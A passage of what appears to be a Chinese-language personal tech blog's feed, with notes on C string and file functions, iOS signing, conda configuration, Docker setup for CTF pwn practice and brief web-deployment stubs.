信号的默认行为是终止进程，因此通常需要自定义信号处理函数来定义触发后的操作。</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">dlopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><hr><h1 id="字符串操作类"><a href="#字符串操作类" class="headerlink" title="字符串操作类"></a>字符串操作类</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">strstr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *haystack, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *needle)</span>;<br></code></pre></td></tr></table></figure><p>返回指向主字符串中第一次出现子字符串的位置的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">strchr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *haystack, <span class="hljs-type">int</span> c)</span>;<br></code></pre></td></tr></table></figure><p>返回指向主字符串中第一次出现<strong>某个字符</strong>的位置的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">snprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>str</code>：目标缓冲区，格式化后的字符串将存储在这里。</li><li><code>size</code>：目标缓冲区的最大长度（包括字符串结束符 <code>\0</code>）。</li><li><code>format</code>：格式化字符串，用于指定输出的格式。</li><li><code>...</code>：可选参数，根据 <code>format</code> 的内容提供相应的值。<br><code>snprintf()</code> 是 C 标准库中的一个安全的字符串格式化函数，用于将格式化的数据写入缓冲区，同时限制输出的长度以防止缓冲区溢出。它的功能类似于 <code>printf()</code>，但更加安全，因为它要求指定缓冲区的最大长度。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">strlen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span>;<br></code></pre></td></tr></table></figure><code>strlen()</code> 是 C 标准库中的一个函数，用于计算字符串的长度。它返回字符串中字符的个数，<strong>不包括字符串结束符 <code>\0</code></strong></li></ul><hr><h1 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>filename</code>：要打开的文件名（路径）。</li><li><code>mode</code>：文件打开模式，常见的模式有：<ul><li><code>&quot;r&quot;</code>：只读模式，文件必须存在。</li><li><code>&quot;w&quot;</code>：写入模式，如果文件存在则清空，如果不存在则创建。</li><li><code>&quot;a&quot;</code>：追加模式，写入内容会添加到文件末尾。</li><li><code>&quot;rb&quot;</code>、<code>&quot;wb&quot;</code>、<code>&quot;ab&quot;</code>：二进制模式（用于读取或写入二进制文件）。</li><li><code>&quot;r+&quot;</code>、<code>&quot;w+&quot;</code>、<code>&quot;a+&quot;</code>：读写模式。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">(FILE *stream)</span>;<br></code></pre></td></tr></table></figure><p><code>stream</code>：文件指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *stream)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>ptr</code>：指向存储读取数据的缓冲区的指针。</li><li><code>size</code>：每个元素的大小（以字节为单位）。</li><li><code>count</code>：要读取的元素数量。</li><li><code>stream</code>：文件指针。</li></ul><hr><p>read</p><hr><p>dlopen()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-comment">/** </span><br><span class="hljs-comment">* @brief 在运行时候加载指定的动态库 返回一个句柄</span><br><span class="hljs-comment">* @param filename 动态库路径  若为null:返回主程序的句柄</span><br><span class="hljs-comment">* @param flag 控制加载行为的标志</span><br><span class="hljs-comment">* @return 成功返回动态库的句柄 失败返回null</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">dlopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> flag)</span>;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gdb跟进父进程或子进程的问题</title>
    <link href="/2025/03/18/gdb%E8%B7%9F%E8%BF%9B%E7%88%B6%E8%BF%9B%E7%A8%8B%E6%88%96%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2025/03/18/gdb%E8%B7%9F%E8%BF%9B%E7%88%B6%E8%BF%9B%E7%A8%8B%E6%88%96%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ios签名</title>
    <link href="/2025/03/17/ios%E7%AD%BE%E5%90%8D/"/>
    <url>/2025/03/17/ios%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<p>ios app 开发门槛真是高</p><p>没有mac和xcode就算了</p><p>我用vscode + uniapp + hbuilder还不行（windows）<br>结果真机调试运行还得注册开发者账号 + 获取ios签名<br>这就是高贵的苹果✌吗 😭</p><hr><p>在windows上开发调试ios app途径：</p><ol><li>注册开发者账号 + 签名</li></ol><p>官方正经 途径<br>但是 $99&#x2F;年的价格 + 注册流程困难<br>还是算了</p><hr><ol start="2"><li>使用爱思助手进行自签名</li></ol><p>不太想尝试<br>算了还是试试吧</p><blockquote><p>具体方法参见uniapp官方文档<a href="https://uniapp.dcloud.net.cn/tutorial/run/ios-apple-certificate-signature.html">使用Apple证书签名iOS标准基座@iOSAppleCertificateSignature | uni-app官网</a></p></blockquote><p>这种方法所得的签名有效期为7天，7天后会掉签，需要重新签名</p><hr><ol start="3"><li>购买ios超级签</li></ol>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ios</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>conda不完全指北</title>
    <link href="/2025/03/16/conda%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2025/03/16/conda%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>安装anaconda后，<br>将anaconda适配到powershell</p><p>每次启动powershell都会默认激活虚拟环境base<br>查看pip版本<br><img src="/2024/10/29/hello-world/ile-20250316220129252.png"><br>发现是anaconda中的pip<br>查看python版本和安装位置<br><img src="/2024/10/29/hello-world/ile-20250316220433217.png"><br>发现也是anaconda中的</p><p>说明已经正确安装了conda并且激活了虚拟环境base</p><hr><p>那么如何取消默认激活base环境？</p><hr><p>查看本机conda默认配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda config --show<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250316215812261.png"><br>我们可以看到<br><code>auto_activate_base</code>属性默认设置为 <code>True</code><br>将其设置为<code>False</code>即可</p><p>使用命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda config --<span class="hljs-built_in">set</span> auto_activate_base False<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250316220749782.png"><br>执行后查看<br><code>auto_activate_base</code>已经变成了<code>False</code></p><hr><p>关闭终端后再启动<br><img src="/2024/10/29/hello-world/ile-20250316221052211.png"><br>发现路径前已经没有了base前缀，<br>pip 和 python 切换成系统的pip和python了</p><h1 id="conda常用命令"><a href="#conda常用命令" class="headerlink" title="conda常用命令"></a>conda常用命令</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda create --name mmc python=3.10<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker使用指南</title>
    <link href="/2025/03/16/docker%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2025/03/16/docker%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<h1 id="使用Docker搭建CTF-Pwn做题环境"><a href="#使用Docker搭建CTF-Pwn做题环境" class="headerlink" title="使用Docker搭建CTF Pwn做题环境"></a>使用Docker搭建CTF Pwn做题环境</h1><blockquote><p>为了保证利用脚本能够正常打通，<br> 我们通常需要在<strong>本地准备相同的运行环境</strong>，<br> 并且在远程利用之前先在本地进行测试</p></blockquote><p>如果为每个不同的运行环境都单独准备一个Ubuntu虚拟机，<br>则太<strong>不优雅</strong>了</p><hr><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><blockquote><p>操作系统层面上的虚拟化方案<br>能够非常便捷地搭建不同pwn题所对应的原始环境</p></blockquote><blockquote><p>[!note] 对比虚拟机<br>硬件层面的虚拟化方案</p></blockquote><h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2><p><a href="https://blog.csdn.net/leah126/article/details/131871717">Docker入门教程（非常详细）从零基础入门到精通，看完这一篇就够了_docker教程-CSDN博客</a><br><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">Environment - CTF Wiki</a></p><p><img src="/2024/10/29/hello-world/file-20250318205700546.png"><br><img src="/2024/10/29/hello-world/file-20250318205757389.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs awk">❯ cat <span class="hljs-regexp">/etc/</span>ssh/ssh_config<br><br><span class="hljs-comment"># This is the ssh client system-wide configuration file.  See</span><br><span class="hljs-comment"># ssh_config(5) for more information.  This file provides defaults for</span><br><span class="hljs-comment"># users, and the values can be changed in per-user configuration files</span><br><span class="hljs-comment"># or on the command line.</span><br><br><span class="hljs-comment"># Configuration data is parsed as follows:</span><br><span class="hljs-comment">#  1. command line options</span><br><span class="hljs-comment">#  2. user-specific file</span><br><span class="hljs-comment">#  3. system-wide file</span><br><span class="hljs-comment"># Any configuration value is only changed the first time it is set.</span><br><span class="hljs-comment"># Thus, host-specific definitions should be at the beginning of the</span><br><span class="hljs-comment"># configuration file, and defaults at the end.</span><br><br><span class="hljs-comment"># Site-wide defaults for some commonly used options.  For a comprehensive</span><br><span class="hljs-comment"># list of available options, their meanings and defaults, please see the</span><br><span class="hljs-comment"># ssh_config(5) man page.</span><br><br>Include <span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/ssh_config.d/</span>*.conf<br><br>Host *<br><span class="hljs-comment">#   ForwardAgent no</span><br><span class="hljs-comment">#   ForwardX11 no</span><br><span class="hljs-comment">#   ForwardX11Trusted yes</span><br><span class="hljs-comment">#   PasswordAuthentication yes</span><br><span class="hljs-comment">#   HostbasedAuthentication no</span><br><span class="hljs-comment">#   GSSAPIAuthentication no</span><br><span class="hljs-comment">#   GSSAPIDelegateCredentials no</span><br><span class="hljs-comment">#   GSSAPIKeyExchange no</span><br><span class="hljs-comment">#   GSSAPITrustDNS no</span><br><span class="hljs-comment">#   BatchMode no</span><br><span class="hljs-comment">#   CheckHostIP yes</span><br><span class="hljs-comment">#   AddressFamily any</span><br><span class="hljs-comment">#   ConnectTimeout 0</span><br><span class="hljs-comment">#   StrictHostKeyChecking ask</span><br><span class="hljs-comment">#   IdentityFile ~/.ssh/id_rsa</span><br><span class="hljs-comment">#   IdentityFile ~/.ssh/id_dsa</span><br><span class="hljs-comment">#   IdentityFile ~/.ssh/id_ecdsa</span><br><span class="hljs-comment">#   IdentityFile ~/.ssh/id_ed25519</span><br><span class="hljs-comment">#   Port 22</span><br><span class="hljs-comment">#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span><br><span class="hljs-comment">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</span><br><span class="hljs-comment">#   EscapeChar ~</span><br><span class="hljs-comment">#   Tunnel no</span><br><span class="hljs-comment">#   TunnelDevice any:any</span><br><span class="hljs-comment">#   PermitLocalCommand no</span><br><span class="hljs-comment">#   VisualHostKey no</span><br><span class="hljs-comment">#   ProxyCommand ssh -q -W %h:%p gateway.example.com</span><br><span class="hljs-comment">#   RekeyLimit 1G 1h</span><br><span class="hljs-comment">#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k</span><br>    SendEnv LANG LC_*<br>    HashKnownHosts yes<br>    GSSAPIAuthentication yes<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/file-20250318205927660.png"></p><h2 id="网络问题"><a href="#网络问题" class="headerlink" title="网络问题"></a>网络问题</h2><p>ping 命令不走配置代理的原因<br>通过配置代理是不能影响ping命令的。大家都知道ping命令是直接使用icmp协议来检测网址是否可达的。而我们配置的代理是直接配置了http代理。</p><p>Http是应用层协议，icmp是网络层协议。配置代理过程是配置了应用层协议，是不会影响网络层协议的，也就解释了设置http代理以后在终端还是ping不通Google</p><p>可以用curl</p><hr><p>问题：<br><img src="/2024/10/29/hello-world/file-20250318213056586.png"></p><p>查看docker占用的存储空间</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker system <span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>清除build cache缓存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker builder prune<br></code></pre></td></tr></table></figure><p>重启docker服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure><p>真神解决方案：<br><a href="https://blog.csdn.net/weixin_50160384/article/details/139861337">从Docker拉取镜像一直失败超时？这些解决方案帮你解决烦恼_docker拉取镜像超时-CSDN博客</a><br>我采用的方案二：<br>使用代理拉取镜像：<br>一、 创建配置文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d <br><span class="hljs-built_in">sudo</span> vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure><p>二、在配置文件中添加代理</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-string">Environment=&quot;HTTP_PROXY=http://127.0.0.1:7890&quot;</span> <span class="hljs-string">Environment=&quot;HTTPS_PROXY=http://127.0.0.1:7890&quot;</span><br></code></pre></td></tr></table></figure><p>三、重启docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> systemctl restart docker<br><span class="hljs-comment"># 或（wsl）</span><br><span class="hljs-built_in">sudo</span> service restart docker<br></code></pre></td></tr></table></figure><p>四、查看环境变量</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> systemctl show --property=Environment docker<br></code></pre></td></tr></table></figure><p>终于搞好了，泪目</p><hr><p>swap file</p><hr><p>查看已有镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker images<br><br><span class="hljs-comment"># 包括中间层</span><br>docker images all<br></code></pre></td></tr></table></figure><hr><p>构建镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker build -t pwnenv_ubuntu24 .<br></code></pre></td></tr></table></figure><p>需指定tag（镜像名称）和构建上下文</p><p>创建并启动容器<br>    守卫模式（后台运行）<br>    映射端口<br>    命名容器<br>    挂载目录<br>    镜像名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 创建并启动容器</span><br>docker run \ <br>   -d \ <br>   -p 25000:22 \ <br>   --name=pwn14 \ <br>   -v ~/ctfDojo:/ctfDojo \ <br>   pwnenv_ubuntu14<br><br><span class="hljs-comment"># 仅创建，不启动容器</span><br>docker create<br></code></pre></td></tr></table></figure><p>在已经运行的容器中执行命令 指定工作目录<br>    设置环境变量TERM（显示相关）<br>    指定容器用户<br>    -i 交互模式 -t 分配伪终端（用于交互式会话） 并指定目标容器<br>    启动bash</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">docker exec -w /ctfDojo <span class="hljs-string">\</span><br>       -e TERM=xterm-<span class="hljs-number">256color</span> <span class="hljs-string">\</span><br>       -u ubuntu <span class="hljs-string">\</span><br>       -<span class="hljs-literal">it</span> pwn24 <span class="hljs-string">\</span><br>       bash<br></code></pre></td></tr></table></figure><hr><p>使用ssh连接入容器环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ssh root@localhost -p 25000<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ssh ubuntu@localhost -p 25000<br></code></pre></td></tr></table></figure><hr><h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h2><p>停止容器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker stop &lt;name&gt;<br></code></pre></td></tr></table></figure><p>启动容器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 启动已停止或已创建的容器</span><br>docker start &lt;容器ID或容器名&gt;<br></code></pre></td></tr></table></figure><p>查看容器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 查看运行中的容器</span><br>docker ps <br><br><span class="hljs-comment"># 查看所有容器(包括停止的容器)</span><br>docker ps -a<br></code></pre></td></tr></table></figure><p>删除容器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 删除单个容器</span><br>docker <span class="hljs-built_in">rm</span> &lt;容器ID或容器名&gt;<br></code></pre></td></tr></table></figure><p>查看镜像列表</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker images<br></code></pre></td></tr></table></figure><p>删除镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 删除单个镜像</span><br>docker rmi &lt;镜像ID或镜像名:标签&gt;<br><br><span class="hljs-comment"># 删除所有镜像</span><br>docker rmi $(docker images -q)<br><br><span class="hljs-comment"># 删除所有未使用的镜像</span><br>docker images prune<br></code></pre></td></tr></table></figure><hr><p>docker pull可以成功但是docker build失败的奇怪问题</p><h3 id="docker-build-和-docker-pull-的行为不同"><a href="#docker-build-和-docker-pull-的行为不同" class="headerlink" title="docker build 和 docker pull 的行为不同"></a><strong><code>docker build</code> 和 <code>docker pull</code> 的行为不同</strong></h3><ul><li><p>**<code>docker pull</code>**：</p><ul><li>直接从 Docker Hub 拉取镜像到本地。</li><li>如果网络连接正常，且镜像可以被成功解析和下载，<code>docker pull</code> 通常不会有问题。</li></ul></li><li><p>**<code>docker build</code>**：</p><ul><li>在构建过程中，Docker 会尝试解析 <code>Dockerfile</code> 中的 <code>FROM</code> 指令，并从 Docker Hub 拉取基础镜像。</li><li>如果 Docker 守护进程的网络配置（如代理、DNS）有问题，可能导致 <code>docker build</code> 无法解析或拉取镜像，即使 <code>docker pull</code> 可以成功。</li></ul></li></ul><p>在<code>sudo vim /etc/docker/daemon.json</code>设置dns方法是不行的（8.8.8.8和8.8.4.4）仅5s就error 显示报错connection reset </p><p>但是上文方法二配置代理的方法还是有用的<br>配置代理后，docker pull可以成功（否则不能成功）<br>然后再docker build即可成功</p><hr><p>补：<br><img src="/2024/10/29/hello-world/file-20250322114850892.png"><br><del>今天尝试在Dockerfile文件前面开头处添加配置代理即可直接build过程中拉取成</del><br>（看我放的位置，其实和它没关系）</p><p>再补：<br>并非，去掉之后也能拉取成功，看来直接build得看运气</p><hr><h1 id="pwndocker"><a href="#pwndocker" class="headerlink" title="pwndocker"></a>pwndocker</h1><p>skysider&#x2F;pwndocker</p><hr><h1 id="关于pwn题的环境"><a href="#关于pwn题的环境" class="headerlink" title="关于pwn题的环境"></a>关于pwn题的环境</h1><p>目前我所已知的三种较为推荐的方式：将本地环境和远程环境相统一</p><ol><li><p>patchelf + glibc-all-in-one<br><a href="%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc.md">更改pwn题libc</a></p></li><li><p>在脚本中打开本地进程这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">process([<span class="hljs-string">&quot;ld路径“, &quot;</span>./题目<span class="hljs-string">&quot;], env=&#123;&quot;</span>LD_PRELOAD<span class="hljs-string">&quot;:&quot;</span>libc路径<span class="hljs-string">&quot;&#125;)</span><br></code></pre></td></tr></table></figure></li><li><p>docker pwndocker</p></li></ol><hr><p><a href="https://www.cnblogs.com/Chary/p/18096678">如何优雅的给 Docker 配置网络代理 - CharyGao - 博客园</a></p><h1 id="Docker网络模式"><a href="#Docker网络模式" class="headerlink" title="Docker网络模式"></a>Docker网络模式</h1><h2 id="docker容器内的网络问题"><a href="#docker容器内的网络问题" class="headerlink" title="docker容器内的网络问题"></a>docker容器内的网络问题</h2><p>我的层次结构是<br>windows -&gt; ubuntu(wsl2) -&gt; ubuntu(docker)<br>（docker用的是linux版docker）<br>windows上有代理服务</p><p>我实在没搞好怎么在docker桥接模式下走代理</p><p>于是我使用host模式</p><p>终于搞好：<br><img src="/2024/10/29/hello-world/file-20250322194318792.png"></p><h1 id="docker网络问题总结"><a href="#docker网络问题总结" class="headerlink" title="docker网络问题总结"></a>docker网络问题总结</h1><p>docker网络问题中的三个代理：<br>系统代理       docker拉取镜像时不会自动使用系统的代理设置，如果需要通过代理拉取镜像，需要手动配置 Docker 的代理设置。<br>docker拉取镜像时走的代理  <code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>中设置（<code>/etc/docker/daemon.json</code>可能也可以）<br>docker容器走的代理  和docker网络模式有关</p><p>以上。</p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx</title>
    <link href="/2025/03/15/Nginx/"/>
    <url>/2025/03/15/Nginx/</url>
    
    <content type="html"><![CDATA[<blockquote><p>怀着复杂悲伤的心情写这篇文章<br>顶着十分困倦的状态</p></blockquote><p>Nginx是高性能的HTTP和反向代理web服务器，<br>处理高并发能力十分强大，<br>支持热部署，启动简单，可以做到不间断运行。</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>静态网站搭建与部署</title>
    <link href="/2025/03/14/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%83%A8%E7%BD%B2/"/>
    <url>/2025/03/14/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>三更半夜了搁这儿学网站部署，不嘻嘻😡</p></blockquote><h2 id="1-注册域名"><a href="#1-注册域名" class="headerlink" title="1. 注册域名"></a>1. 注册域名</h2><p>搭建静态网站之前，首先得有个网站域名</p><blockquote><p>应该有了，此步略</p></blockquote><h2 id="2-创建Bucket"><a href="#2-创建Bucket" class="headerlink" title="2.创建Bucket"></a>2.创建Bucket</h2><h1 id="CI-CD"><a href="#CI-CD" class="headerlink" title="CI&#x2F;CD"></a>CI&#x2F;CD</h1><p>在项目中写一个<code>.github/workflows/ci.yml</code>文件</p><blockquote><p>参考：<br><a href="https://juejin.cn/post/7222654249133981752">GitHub Actions 进行前端自动化部署如何使用 GitHub Actions 实现前端项目的自动化部署到服务器 - 掘金</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前后端实时双向通信</title>
    <link href="/2025/03/10/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%9E%E6%97%B6%E5%8F%8C%E5%90%91%E9%80%9A%E4%BF%A1/"/>
    <url>/2025/03/10/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%9E%E6%97%B6%E5%8F%8C%E5%90%91%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<p>本来想在 <em>珞珈攻略6.0</em> 这个项目中实现一下子，<br>但想到可以用计算来代替，就算了（时间有限</p><p><a href="https://zhuanlan.zhihu.com/p/3428014292">使用vue3实现计时器和倒计时效果 - 知乎</a></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前后端联调之后端</title>
    <link href="/2025/03/09/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%81%94%E8%B0%83%E4%B9%8B%E5%90%8E%E7%AB%AF/"/>
